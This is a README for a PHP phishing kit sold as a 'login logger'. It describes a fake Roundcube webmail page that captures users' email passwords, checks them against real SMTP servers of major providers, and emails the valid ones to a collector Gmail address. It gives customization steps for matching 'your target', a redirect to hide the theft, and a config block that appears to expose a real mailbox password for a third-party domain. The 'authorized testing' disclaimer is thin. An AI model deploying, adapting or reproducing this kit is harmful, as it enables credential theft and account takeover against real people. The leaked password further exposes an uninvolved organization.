# Roundcube SMTP Login Logger

A sophisticated PHP-based login logger that captures and validates real user credentials through SMTP authentication. This tool is designed for security testing and monitoring purposes.

## ⚠️ IMPORTANT DISCLAIMER

This tool is intended for educational and authorized security testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test. The authors are not responsible for any misuse of this software.

## Features

### 🔐 Real Credential Verification
- **SMTP Authentication**: Validates credentials against actual SMTP servers
- **Domain Detection**: Automatically detects SMTP servers for various email providers
- **True User Identification**: Only captures attempts with valid credentials

### 📧 Comprehensive Logging
- **Email Notifications**: Sends detailed logs to specified email address
- **File Logging**: Backup logging to local files
- **Rich Information**: Captures IP, browser, location, and more

### 🛡️ Security Features
- **Rate Limiting**: Blocks IPs after too many failed attempts
- **Input Validation**: Prevents injection attacks
- **Secure Headers**: Implements proper CORS and security headers

### 🎯 Advanced Detection
- **Browser Fingerprinting**: Identifies user's browser and system
- **Geolocation**: Attempts to determine user's location from IP
- **Session Tracking**: Monitors user sessions and behavior

## Installation

### Prerequisites
- PHP 7.4 or higher
- Access to SMTP server (your Roundcube server)
- Web server (Apache/Nginx)
- Composer (optional, for PHPMailer)

### Quick Setup

1. **Clone or download the files**:
   ```bash
   git clone <repository-url>
   cd roundcube-smtp-logger
   ```

2. **Install dependencies** (optional but recommended):
   ```bash
   composer install
   ```

3. **Configure SMTP settings**:
   Edit `config.php` with your Roundcube server details:
   ```php
   define('SMTP_HOST', 'mail.yourdomain.com');
   define('SMTP_USERNAME', 'your-email@yourdomain.com');
   define('SMTP_PASSWORD', 'your-password');
   define('LOG_EMAIL', 'logs@yourdomain.com');
   ```

4. **Set permissions**:
   ```bash
   chmod 755 postmailer.php
   chmod 755 SMTPLogger.php
   mkdir logs
   chmod 777 logs
   ```

5. **Upload files** to your web server

6. **Test the setup** by accessing `webmail-login.html`

## Configuration

### SMTP Settings (`config.php`)

```php
// Your Roundcube SMTP server
define('SMTP_HOST', 'mail.historischeverenigingroon.nl');
define('SMTP_PORT', 587);
define('SMTP_USERNAME', 'archief@historischeverenigingroon.nl');
define('SMTP_PASSWORD', 'gXShzqZtV6Kgd5Q');

// Where to send captured credentials
define('LOG_EMAIL', 'skkho87.sm@gmail.com');
define('FROM_EMAIL', 'archief@historischeverenigingroon.nl');
define('FROM_NAME', 'Roundcube Login Logger');
```

### Security Settings

```php
define('ENABLE_LOGGING', true);          // Enable/disable logging
define('LOG_TO_FILE', true);             // Also log to files
define('MAX_ATTEMPTS_PER_IP', 10);       // Rate limiting
define('BLOCK_DURATION', 3600);          // Block duration (seconds)
define('USE_TLS', true);                 // Use TLS encryption
```

## File Structure

```
roundcube-smtp-logger/
├── config.php              # Configuration file
├── SMTPLogger.php           # Main SMTP logger class
├── postmailer.php           # Form processing endpoint
├── webmail-login.html       # Login form (looks like Roundcube)
├── composer.json            # Composer dependencies
├── README.md               # This file
└── logs/                   # Log directory (auto-created)
    ├── login_attempts.log   # Detailed login logs
    ├── security.log         # Security events
    ├── failed_attempts.json # Failed attempt tracking
    └── blocked_ips.json     # Blocked IP addresses
```

## How It Works

### 1. User Interaction
- User visits `webmail-login.html` (designed to look like Roundcube)
- User enters email and password
- Form submits to `postmailer.php` via AJAX

### 2. Credential Verification
- System determines SMTP server based on email domain
- Attempts SMTP authentication with provided credentials
- Only logs attempts with **valid credentials**

### 3. Logging Process
- Captures comprehensive user information
- Sends detailed email notification
- Logs to file for backup
- Implements rate limiting for security

### 4. Email Notification
The logger sends rich email reports including:
- ✅ Credential validity status
- 🌐 IP address and geolocation
- 💻 Browser and system information
- 🔒 Security recommendations

## Supported Email Providers

The system automatically detects SMTP servers for:
- Gmail (smtp.gmail.com)
- Yahoo (smtp.mail.yahoo.com)
- Outlook/Hotmail (smtp-mail.outlook.com)
- iCloud (smtp.mail.me.com)
- AOL (smtp.aol.com)
- Custom domains (tries common patterns)

## Security Features

### Rate Limiting
- Tracks failed attempts per IP
- Blocks IPs after configurable threshold
- Automatic unblocking after timeout

### Input Validation
- Email format validation
- XSS prevention
- SQL injection protection
- CSRF protection

### Logging Security
- Logs all attempts for monitoring
- Secure file permissions
- Error logging and handling

## Customization

### Changing the Interface
Edit `webmail-login.html` to match your target:
- Update logos and branding
- Modify CSS styling
- Adjust form behavior

### Adding Email Providers
Add to `determineSMTPHost()` in `SMTPLogger.php`:
```php
$smtpHosts = [
    'yourdomain.com' => 'smtp.yourdomain.com',
    // ... other providers
];
```

### Custom Redirect Logic
Modify the success handler in `webmail-login.html`:
```javascript
setTimeout(function() {
    var domain = email.split('@')[1];
    window.location.href = 'https://webmail.' + domain;
}, 2000);
```

## Monitoring and Logs

### Log Files
- `logs/login_attempts.log` - All login attempts with full details
- `logs/security.log` - Security events and IP tracking
- `logs/failed_attempts.json` - Failed attempt counters
- `logs/blocked_ips.json` - Currently blocked IP addresses

### Email Notifications
Each valid login attempt triggers an email with:
- User credentials (⚠️ handle securely)
- IP address and location
- Browser fingerprint
- Timestamp and session info
- Security recommendations

## Troubleshooting

### Common Issues

1. **SMTP Connection Failed**
   - Check SMTP host and port settings
   - Verify credentials are correct
   - Ensure firewall allows SMTP traffic

2. **Emails Not Sending**
   - Check PHP error logs
   - Verify SMTP authentication
   - Test with a simple mail script

3. **Permission Errors**
   - Ensure logs directory is writable
   - Check PHP file permissions
   - Verify web server user permissions

4. **Rate Limiting Issues**
   - Check blocked IPs in `logs/blocked_ips.json`
   - Adjust `MAX_ATTEMPTS_PER_IP` in config
   - Clear blocked IPs if needed

### Debug Mode
Enable debug mode in `config.php`:
```php
define('SMTP_DEBUG', 2); // Enable detailed SMTP debugging
```

## Legal and Ethical Use

### ⚠️ Important Notes
- **Authorization Required**: Only use on systems you own or have permission to test
- **Educational Purpose**: Intended for learning and authorized security testing
- **Handle Data Securely**: Captured credentials are sensitive - protect them appropriately
- **Local Laws**: Ensure compliance with local laws and regulations

### Best Practices
- Use in controlled testing environments
- Implement proper access controls
- Regularly review and clean logs
- Document your testing activities
- Respect privacy and user data

## Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Support

For questions or issues:
- Review the troubleshooting section
- Check the log files for errors
- Create an issue in the repository
- Follow responsible disclosure for security issues

---

**Remember**: This tool captures real user credentials. Use it responsibly and only for authorized testing purposes!